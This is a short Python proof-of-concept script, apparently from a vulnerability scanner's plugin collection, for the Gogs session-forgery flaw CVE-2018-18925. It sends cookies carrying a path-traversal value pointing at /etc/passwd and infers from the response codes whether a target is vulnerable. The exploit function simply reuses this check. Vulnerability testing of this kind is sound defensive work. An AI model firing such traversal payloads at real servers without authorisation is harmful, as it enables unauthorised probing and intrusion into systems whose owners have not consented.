import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Gogs - Remote Code Execution (CVE-2018-18925)''',
        "description": '''Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a ".." session-file forgery in the file session provider in file.go. This is related to session ID handling in the go-macaron/session code for Macaron.''',
        "severity": "critical",
        "references": [
            "https://www.anquanke.com/post/id/163575", 
            "https://github.com/vulhub/vulhub/tree/master/gogs/CVE-2018-18925", 
            "https://nvd.nist.gov/vuln/detail/cve-2018-18925"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2018-18925",
            "cwe-id": "CWE-384"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2018", "gogs", "lfi", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {'Cookie': 'lang=en-US; i_like_gogits=../../../../etc/passwd;'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {'Cookie': 'lang=en-US; i_like_gogits=../../../../etc/dummy;'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp0.status_code == 500 and resp1.status_code == 200 and "<meta name=\"author\" content=\"Gogs\" />" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url